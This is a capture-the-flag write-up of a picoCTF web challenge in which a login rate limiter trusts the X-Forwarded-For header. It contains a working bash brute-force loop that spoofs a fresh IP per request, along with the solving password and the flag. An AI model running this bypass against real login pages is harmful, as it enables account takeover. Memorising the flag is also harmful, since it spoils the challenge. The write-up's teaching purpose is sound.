# Crack the Gate 2

**Platform:** CyLab Security Academy (picoCTF), picoMini by CMU-Africa
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{xff_byp4ss_brut3_1c447e47}`

## Summary

The login endpoint's rate limiter keys off the client-supplied `X-Forwarded-For` header instead
of (or in addition to) the actual connecting socket address. Since that header is fully
attacker-controlled and unvalidated, sending a different fake value on every request gives each
attempt its own fresh rate-limit bucket, defeating the lockout entirely and allowing a full
password-list brute force against a known account email.

## Discovery

A single failed login attempt is enough to trigger the limiter:

```
POST /login {"email":"ctf-player@picoctf.org","password":"wrongpass"}
{"success":false}
```

```
POST /login {"email":"ctf-player@picoctf.org","password":"wrongpass"}
{"success":false,"error":"Too many failed attempts. Please try again in 20 minutes."}
```

Adding an arbitrary `X-Forwarded-For` header on the next attempt clears the lockout immediately:

```
curl -X POST /login -H "X-Forwarded-For: 1.2.3.4" -d '{"email":"...","password":"..."}'
{"success":false}
```

No `"Too many failed attempts"` error, confirming the rate limiter tracks requests by the
`X-Forwarded-For` value rather than (or instead of) the real source IP.

## Proof of Concept

Send each password from the provided 19-entry wordlist with a distinct, made-up
`X-Forwarded-For` value so every guess lands in its own untouched rate-limit bucket:

```bash
BASE="http://TARGET"
i=10
while IFS= read -r pw; do
  i=$((i+1))
  fakeip="10.$((i/256)).$((i%256)).$((RANDOM%254+1))"
  curl -s -X POST "$BASE/login" -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $fakeip" \
    -d "{\"email\":\"ctf-player@picoctf.org\",\"password\":\"$pw\"}"
done < passwords.txt
```

The password `rCRnekkE` succeeds:

```json
{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{xff_byp4ss_brut3_1c447e47}"}
```

## Root Cause

The `X-Forwarded-For` header exists so that a trusted reverse proxy can tell a backend the real
client IP behind it, but it is just an ordinary request header: any client can set it to
whatever value it wants when talking directly to the server. Rate limiting (or any other
security control) that trusts this header without it having been set by a verified, trusted
proxy in front of the application effectively lets the attacker choose their own rate-limit
identity on every single request.

## CWE / OWASP

- **CWE-807**: Reliance on Untrusted Inputs in a Security Decision
- **CWE-290**: Authentication Bypass by Spoofing
- **CWE-307**: Improper Restriction of Excessive Authentication Attempts
- **OWASP A07:2021**: Identification and Authentication Failures
